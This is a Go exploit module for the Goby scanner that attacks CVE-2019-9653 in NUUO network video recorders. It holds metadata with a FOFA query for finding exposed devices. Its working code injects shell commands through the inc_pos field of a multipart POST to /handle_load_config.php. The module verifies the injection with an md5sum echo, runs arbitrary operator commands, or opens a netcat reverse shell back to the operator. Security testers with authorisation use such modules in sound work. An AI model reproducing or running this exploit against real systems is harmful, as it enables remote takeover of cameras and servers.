package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "NUUO network camera handle_load_config.php file command execution vulnerability (CVE-2019-9653)",
    "Description": "<p>NUUO is a company that provides a video surveillance solution. They have many NVR (Network Video Recorder) products that cater to various requirements of different customers. NVR is an embedded video capture system for Linux, which can manage multiple cameras. At present, they are used in many public, corporate, attack and personal.</p><p>Attackers can use this vulnerability to execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.nuuo.com/\">https://www.nuuo.com/</a></p>",
    "Product": "NUUO Network Video Recorder",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "NUUO 网络摄像机 handle_load_config.php 文件命令执行漏洞（CVE-2019-9653）",
            "Product": "NUUO 网络摄像机",
            "Description": "<p>NUUO是一家提供一个视讯监控解决方案的公司。他们有许多NVR（网路视讯录影机）产品，可满足不同客户的各种要求。NVR为Linux的嵌入式视讯采集系统，可以管理多个摄影机目前，它们在许多公共、公司、攻击及个人等使用。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.nuuo.com/\" target=\"_blank\">https://www.nuuo.com/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "NUUO network camera handle_load_config.php file command execution vulnerability (CVE-2019-9653)",
            "Product": "NUUO Network Video Recorder",
            "Description": "<p>NUUO is a company that provides a video surveillance solution. They have many NVR (Network Video Recorder) products that cater to various requirements of different customers. NVR is an embedded video capture system for Linux, which can manage multiple cameras. At present, they are used in many public, corporate, attack and personal.</p><p>Attackers can use this vulnerability to execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.nuuo.com/\" target=\"_blank\">https://www.nuuo.com/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"NUUO\"&&title=\"Network Video Recorder Login\"",
    "GobyQuery": "body=\"NUUO\"&&title=\"Network Video Recorder Login\"",
    "Author": "1014207228@qq.com",
    "Homepage": "https://www.nuuo.com/",
    "DisclosureDate": "2022-04-02",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9653",
        "https://github.com/grayoneday/CVE-2019-9653"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2019-9653"
    ],
    "CNVD": [
        "CNVD-2019-16401"
    ],
    "CNNVD": [
        "CNNVD-201905-1233"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "cmd,goby_shell_linux",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "NUUO-NVR"
        ]
    },
    "CVSSScore": "9.8",
    "PocId": "10362"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/handle_load_config.php")
			boundary := goutils.RandomHexString(8)
			contentType := "multipart/form-data;boundary=-" + boundary
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("Content-Type", contentType)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			postData := `---boundary
Content-Disposition: form-data; name="inc_pos"
yes'&&%s||'
---boundary
Content-Disposition: form-data; name="upload_file"; filename="configuration.cfg"
Content-Type: application/octet-stream
---boundary--`
			postData = strings.ReplaceAll(postData, "boundary", boundary)
			postData = strings.ReplaceAll(postData, "\n", "\r\n")
			randStr := goutils.RandomHexString(4)
			chkStr := fmt.Sprintf("%x", md5.Sum([]byte(randStr)))
			payload := fmt.Sprintf("echo -n %s|md5sum", randStr)
			postData = fmt.Sprintf(postData, payload)
			cfg.Data = postData
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, chkStr) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/handle_load_config.php")
			boundary := goutils.RandomHexString(4)
			contentType := "multipart/form-data;boundary=-" + boundary
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("Content-Type", contentType)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			postData := `---boundary
Content-Disposition: form-data; name="inc_pos"
yes'&&%s||'
---boundary
Content-Disposition: form-data; name="upload_file"; filename="configuration.cfg"
Content-Type: application/octet-stream
---boundary--`
			postData = strings.ReplaceAll(postData, "boundary", boundary)
			postData = strings.ReplaceAll(postData, "\n", "\r\n")
			var payload string
			if ss.Params["AttackType"].(string) == "cmd" {
				payload = ss.Params["cmd"].(string)
				postData = fmt.Sprintf(postData, payload)
				cfg.Data = postData
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = regexp.MustCompile(`\<\/html\>\s([\s\S]*)`).FindStringSubmatch(resp.Utf8Html)[1]
						return expResult
					} else {
						expResult.Success = false
						expResult.Output = "command exec fail,please try again"
					}
				}
			} else {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					payload := godclient.ReverseTCPByNcBsd(rp)
					postData = fmt.Sprintf(postData, payload)
					cfg.Data = postData
					httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					select {
					case webConsleID := <-waitSessionCh:
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):
					}
				}
			}
			return expResult
		},
	))
}
